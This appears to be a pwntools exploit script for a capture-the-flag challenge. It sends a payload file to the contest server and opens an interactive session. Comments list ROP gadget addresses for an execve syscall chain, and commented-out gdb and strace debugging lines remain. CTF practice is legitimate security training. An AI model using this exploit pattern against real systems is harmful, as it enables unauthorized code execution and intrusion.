import os
import sys
from pwn import *

context.terminal = ['./nvimterm']
f = sys.argv[1]

# we basically have full memory control. This is pretty easy.
#        int execve(const char *pathname, char *const argv[],
#                   char *const envp[]);
# execve::rax(rdi, rsi, rdx)
# the shittiest ROP chain ever
# 0x000000000045086c: pop rax; ret;
# 0x0000000000401716: pop rdi; ret;
# 0x0000000000402a56: pop rsi; ret;
# 0x000000000044fd05: pop rdx; ret;
# 0x000000000040120f: syscall;

fd = open(f, 'rb')
stat = os.stat(f)
sz = stat.st_size

# yes i had to write a freaking gdb extension
# io = gdb.debug('./chal', gdbscript="""
# #source gdbext.py
# #break *0x402354
# # command 1
# # si
# # break *$pc + 0x83
# # break *$pc + 0x94
# # break *$pc + 0xdc
# # break *$pc + 0x2bc
# # end
#
# #break *(nanosleep+15)
# set detach-on-fork off
# #set follow-fork-mode child
# """)
# io = process(executable='/usr/bin/strace', argv=['-ff', '-o', 'wtf', '--', './chal'])
io = remote('writeonly.2020.ctfcompetition.com', 1337)
#io = remote('localhost', 8000)
input()
io.sendline(str(sz))
io.send(fd.read())
io.interactive()

